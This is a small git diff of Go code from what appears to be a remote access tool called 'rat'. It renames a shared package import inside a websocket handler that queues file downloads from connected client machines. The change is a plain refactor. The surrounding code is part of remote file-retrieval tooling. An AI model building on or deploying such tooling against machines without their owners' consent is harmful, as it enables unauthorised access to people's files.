@@ -3,7 +3,7 @@ package main
 import (
 	"encoding/json"
 	"io/ioutil"
-	"rat/common"
+	"rat/shared"
 
 	"golang.org/x/net/websocket"
 )
@@ -27,7 +27,7 @@ func (d DownloadMessage) Handle(ws *websocket.Conn, client *Client, data string)
 		return err
 	}
 
-	client.Listeners[common.GetFileHeader] = ws
+	client.Listeners[shared.GetFileHeader] = ws
 	Transfers[downloadEvent.File] = &Transfer{file, downloadEvent.File, 0, 0}
 	client.Queue <- &DownloadPacket{File: downloadEvent.File}
 
